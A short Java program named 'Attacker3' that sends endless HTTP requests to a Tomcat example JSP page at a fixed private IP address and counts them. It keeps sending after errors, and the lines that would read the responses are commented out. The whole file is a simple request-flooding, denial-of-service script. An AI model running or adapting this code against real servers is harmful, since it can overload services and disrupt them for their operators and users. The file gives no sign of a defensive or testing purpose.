import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.net.URL;
 
/**
 * @author Crunchify.com
 */
 
public class Attacker3 {
 
	public static void main(String[] args) {
		int i=0;
		while(true)
		{
		try {
			URL url = new URL("http://10.106.31.99:8080/examples/jsp/jsp2/el/basic-arithmetic.jsp");
			BufferedReader br = new BufferedReader(new InputStreamReader(url.openStream()));
			String strTemp = "";
			i++;
			System.out.println("Number of the request:"+i);
			/*while (null != (strTemp = br.readLine())) {
				System.out.println(strTemp);
			}*/
		} catch (Exception ex) {
			ex.printStackTrace();
		 System.out.println("Number of requests sent befor exception:"+i);
			//break;
		}
		}
	}
}